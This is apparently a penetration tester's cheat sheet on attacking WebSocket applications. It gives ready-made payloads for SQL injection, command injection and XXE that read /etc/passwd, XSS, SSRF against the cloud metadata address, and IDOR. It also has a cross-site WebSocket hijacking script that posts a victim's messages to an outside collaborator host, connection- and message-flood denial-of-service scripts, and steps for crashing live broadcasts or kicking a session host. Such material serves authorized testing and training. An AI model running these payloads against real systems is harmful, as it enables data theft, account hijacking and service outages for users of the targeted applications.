# WebSockets

### **Finding Encryption and Compression**

**Burp Ext:** [**https://github.com/Anof-cyber/PyCript-WebSocket/**](https://github.com/Anof-cyber/PyCript-WebSocket/)

_In the Handshake Headers:_

* **`Sec-WebSocket-Extensions: permessage-deflate`** - indicates messages are compressed using DEFLATE (use Python's `zlib` to decompress)
* **`Sec-WebSocket-Protocol`** - may specify a subprotocol like `json`, `protobuf`, `msgpack`, `graphql-ws`, or `mqtt`

_In Client-Side Code:_ Search DevTools (Sources → Ctrl+Shift+F) for cryptographic keywords:

```
crypto.subtle, window.crypto, importKey, deriveKey, encrypt, decrypt, pbkdf2, hkdf, scrypt, AES, RSA, argon2, protobuf, msgpack, base64, mqtt, Uint8Array, atob, new WebSocket, ws.send
```

> Note: `wss://` encrypts the entire connection (transport-level TLS) but if you intercept message or see it from DevTools it will be shown in plain not encrypted.

### **SQL Injection:**

```
{
  "username": "admin' OR '1'='1' -- ",
  "password": "anything"
}
```

### **Command Injection:**

```
{
  "command": "ping 127.0.0.1 && cat /etc/passwd"
}
```

### **XXE - File Reading:**

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]><message><user>&xxe;</user><content>test</content></message>
```

### **XSS (Cross-Site Scripting):**

```
{
  "message": "<img src=0 onerror=alert(1)>"
}
```

### **Server-Side Request Forgery (SSRF):**

```
{
  "url": "<http://169.254.169.254/latest/meta-data/>",
  "action": "fetch_url"
}
```

### **Insecure Direct Object Reference (IDOR) :**

```
// View your own order
{
  "request": "order_details",
  "order_id": "1001"
}

// IDOR - view someone else's order with sensitive info
{
  "request": "order_details",
  "order_id": "1002"  // Another customer's order
}
```

### CSWSH

Cross site web socket hijacking (CSWSH) is similar to CSRF because we utilize the targets cookies to make requests.

Also, like CSRF the target would have to visit our malicious page while logged into the target site for this to work.

The major difference is instead of sending a POST request we initiate a web socket connection. After the `WebSocket` connection is established we can do whatever want.

**How it works:**

1. You visit a malicious website while logged into a vulnerable app
2. The malicious page opens a WebSocket to the vulnerable app
3. Your browser automatically sends your cookies (session) with the handshake
4. The server accepts the connection thinking it's you
5. The attacker now has a live channel to send/receive messages as you

**Payload to do CSWSH:**

```
<script>
    var ws = new WebSocket('wss://victimsite.com/');
    ws.onopen = function() {
        ws.send("profile");
    };
    ws.onmessage = function(event) {
        fetch('<https://burpcollab.oastify.com>', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

### **Denial of Service (DoS)**&#x20;

> Some WebSocket servers trust the payload length declared in frames and pre-allocate buffers accordingly. By sending frames with extremely large length values (close to `Integer.MAX_VALUE`), you can cause OutOfMemory errors and crash the server.

**Connection Flood Attack:**

```
// Open hundreds of WebSocket connections simultaneously
for(let i = 0; i < 500; i++) {
    const ws = new WebSocket('wss://target.com/');
    ws.onopen = function() {
        // Keep each connection active with periodic messages
        setInterval(() => {
            ws.send('SPAM_MESSAGE_' + Date.now());
        }, 100);
    };
}
```

**Message Flood Attack:**

```
// Single connection, continuous massive message spam
const ws = new WebSocket('wss://target.com/');
ws.onopen = function() {
    // Send large messages in an infinite loop
    while(true) {
        ws.send('A'.repeat(10000)); // 10KB per message
    }
};
```

**Compression Bomb Attack:**

```
// Exploit permessage-deflate compression
const ws = new WebSocket('wss://target.com/');
ws.onopen = function() {
    // Send highly compressible data that expands massively
    const highlyCompressible = 'A'.repeat(1000000); // 1MB of repeated data
    ws.send(highlyCompressible);
};
```

### **Race Conditions**

**How to exploit:**

* Use Burp's WebSocket Turbo Intruder
* Send multiple messages simultaneously
* Target endpoints that modify state or check limits
* use [https://github.com/redrays-io/WS\_RaceCondition\_PoC](https://github.com/redrays-io/WS_RaceCondition_PoC) you can find a PoC in Java to send WebSocket messages in parallel to abuse Race Conditions also in Web Sockets.
* With Burp’s WebSocket Turbo Intruder you can use the **THREADED** engine to spawn multiple WS connections and fire payloads in parallel. Start from the official example and tune `config()`(thread count) for concurrency; this is often more reliable than batching on a single connection when racing server‑side state across WS handlers. See [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

### Websocket Smuggling

* The attacker sends a malformed WebSocket upgrade request (with a wrong `Sec-WebSocket-Version`).
* The backend correctly rejects it with a non-101 response (like `426 Upgrade Required`).
* The proxy, performing only partial checks, treats the connection as upgraded and keeps the upstream TCP socket open.
* The attacker reuses this open socket to send standard HTTP requests directly to the backend.

### Examples

#### live chat feature that uses web sockets for communication

*   [ ] **Examine the traffic in burp** Most people only know how to use burp to test HTTP traffic but it can also handle web socket traffic as shown below:

    ![image](https://user-images.githubusercontent.com/108616378/219940597-7ce3e878-97b7-4867-9048-dbe817633434.png)
* [ ] **Create a POC** to see if we can hijack a user’s `WebSocket` connection | We can use the following website to test for the vulnerability:\[[http://websocket.org/echo.html](http://websocket.org/echo.html) ]
*   [ ] **Manipulating WebSocket messages to exploit vulnerabilities**

    ```jsx
    Click "Live chat" and send a chat message. 
    Itercept the request 
    edit message to <img src=1 onerror='alert(1)'>
    ```
* [ ] [**Manipulating the WebSocket handshake to exploit vulnerabilities**](https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities)
* [ ] [**Cross-site WebSocket hijacking**](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)

### Broadcasts Crashes via Manipulating Web-sockets

1. Log in as an admin and assign a moderator to a classroom.
2. As the moderator, intercept the API request for role assignment using tools like Burp Suite or browser developer tools.
3. Modify the request payload as follows:

```
{
    "request_type": "ASSIGN ROLE",
    "payload": {
        "role": "crash",
        "user_id": "55150"
    },
    "request_id": "A1Kptpj0FIfef173-biAa"
}
```

1. Replace the `role` value with a non-standard string such as `crash`.
2. Send the modified request.
3. Observe the effects:

* All live broadcasts in the session will crash.
* Participants will see the error message:

***

### Kick the Session HOST User

1. Moderators intercept WebSocket traffic using tools like browser developer tools or proxies.
2. The **`connection_id`** of the Host is extracted from WebSocket messages.
3. A malicious WebSocket request with the following payload is crafted:

```
{
  "request_type": "KICK",
  "payload": {
    "connection_id": "usr-conn-1ef9c55xu"
  },
  "request_id": "dME5ScO1R4kLK_STnmfUQ"
}
```

4\. The crafted request is sent to the server, resulting in the Host being forcibly removed from the session.<br>
